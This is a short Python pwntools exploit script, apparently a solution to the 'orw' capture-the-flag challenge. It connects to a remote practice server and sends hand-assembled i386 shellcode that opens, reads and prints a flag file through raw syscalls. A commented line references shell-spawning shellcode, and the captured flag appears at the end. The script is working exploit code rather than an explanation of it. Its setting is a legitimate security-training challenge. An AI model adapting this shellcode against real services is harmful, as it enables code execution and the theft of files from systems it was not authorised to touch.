from pwn  import *
#sh =process("./orw")
#context(log_level = 'debug', arch = 'i386', os = 'linux')
#sh=remote('chall.pwnable.tw',10001)
sh = remote('node3.buuoj.cn',29385)
#shellcode=asm(shellcraft.sh()) 
# I don't wanna be a tool boy
shellcode=""
shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
#open(file,0,0)
shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
#read(3,file,0x30)
shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')
#write(1,file,0x30)
print shellcode
recv = sh.recvuntil(':')
sh.sendline(shellcode)
flag = sh.recv(100)
print flag


#FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
#pwned by Ld1ng
